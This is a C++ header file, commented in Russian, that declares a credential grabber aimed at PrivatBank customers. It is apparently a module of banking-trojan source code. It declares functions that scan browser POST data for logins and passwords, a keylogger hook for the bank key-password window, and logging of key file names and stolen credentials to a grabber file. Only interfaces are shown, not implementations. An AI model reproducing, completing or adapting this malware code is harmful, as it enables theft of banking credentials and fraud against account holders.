//---------------------------------------------------------------------------
//  Грабер пароля ключа приватбанка
//---------------------------------------------------------------------------

#ifndef PrivatBankH
#define PrivatBankH
//---------------------------------------------------------------------------

#include <windows.h>


#include "GetApi.h"
#include "Strings.h"
#include "KeyLogger.h"
#include "Grabbers.h"


namespace PrivatBank
{
	//------------------------------------------------
	//  Initialize - Функция инициализирует грабер
	//				 пароля ключа приватбанка
	//------------------------------------------------
	bool Initialize(HWND Wnd, DWORD  WndClassHash);

	//------------------------------------------------
	//  CheckPostData - Функция проверяет пост данные
	//                  на предмет обнаружения логина
	//                  и пароля
	//------------------------------------------------
	void CheckPostData(const char* URL, const char* PostData);
}


//*****************************************************
// Грабер приватбанка
//*****************************************************
class TPrivatBank : public TGrabber
{
private:
	TGrabberFile* FLog;
	HWND   FKeyPassWnd;
	string FKeyPassFieldName;
	bool InitializeMainLog();
	void ParseKeyFileName(const string& Text);
protected:
	void LogKeyboad(HWND aWnd, const char* Text);   // Перекрытый метод
	void DoEvent(int EventId, LPVOID Param);        // Перекрытый метод
public:
	TPrivatBank();
	~TPrivatBank();

	void AddLoginAndPassword(const string& Login, const string& Password);
	void AddKeyFile(const string& FileName);
	void ActivateKeyPassLogger(HWND Wnd, const string& WndText, int WndType);

	int static IsKeyPassWnd(const string& WndText);
};



//---------------------------------------------------------------------------
#endif
